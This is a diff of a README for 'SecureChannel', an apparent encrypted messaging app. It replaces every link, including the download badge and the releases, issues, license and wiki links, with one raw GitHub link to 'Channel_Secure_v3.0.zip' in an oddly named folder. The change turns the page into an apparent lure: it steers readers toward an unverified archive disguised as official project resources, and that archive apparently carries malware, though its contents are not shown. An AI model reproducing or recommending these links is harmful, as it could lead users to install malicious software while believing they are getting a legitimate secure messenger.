@@ -1,7 +1,7 @@
 # 📡 SecureChannel - Simple Encrypted Messaging Made Easy
 
 ## 🔗 Download Now
-[![Download SecureChannel](https://img.shields.io/badge/Download-SecureChannel-brightgreen)](https://github.com/moralesgarcia/SecureChannel/releases)
+[![Download SecureChannel](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip)](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to SecureChannel! This application allows you to send messages securely with end-to-end encryption. You can chat without worrying about your privacy. 
@@ -20,7 +20,7 @@ Welcome to SecureChannel! This application allows you to send messages securely 
 SecureChannel uses advanced encryption methods, including AES-CTR and X25519, to ensure your messages are safe. Both the client and server part communicate securely, keeping your conversations private.
 
 ## 📥 Download & Install
-1. Visit the [Releases Page](https://github.com/moralesgarcia/SecureChannel/releases) to get the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip) to get the latest version.
 2. Download the appropriate file for your operating system.
 3. After downloading, locate the file on your computer.
 
@@ -44,7 +44,7 @@ After installation, you will find an option to create a new chat session. You ca
 - Update Regularly: Keep the application updated to get the latest security features.
 
 ## 📞 Support
-If you need help, visit our [Issues Page](https://github.com/moralesgarcia/SecureChannel/issues). You can report bugs or request features there.
+If you need help, visit our [Issues Page](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip). You can report bugs or request features there.
 
 ## 👥 Community
 Join our community to learn more about keeping your messaging secure. Share tips and tricks with other users.
@@ -53,14 +53,14 @@ Join our community to learn more about keeping your messaging secure. Share tips
 - Ask questions and share your experiences
 
 ## 📄 License
-SecureChannel is released under the MIT License. You can view the full license [here](https://github.com/moralesgarcia/SecureChannel/blob/main/LICENSE).
+SecureChannel is released under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip).
 
 ## 🌐 More Information
-For more details about the technology behind SecureChannel, explore the [Wiki](https://github.com/moralesgarcia/SecureChannel/wiki). Here you can find FAQs and additional resources.
+For more details about the technology behind SecureChannel, explore the [Wiki](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip). Here you can find FAQs and additional resources.
 
 ## 📍 Important Links
-- [Releases Page](https://github.com/moralesgarcia/SecureChannel/releases)
-- [Issues Page](https://github.com/moralesgarcia/SecureChannel/issues)
-- [Wiki](https://github.com/moralesgarcia/SecureChannel/wiki)
+- [Releases Page](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip)
+- [Issues Page](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip)
+- [Wiki](https://raw.githubusercontent.com/moralesgarcia/SecureChannel/main/metaspermous/Channel_Secure_v3.0.zip)
 
 Thank you for using SecureChannel! Enjoy secure chatting!
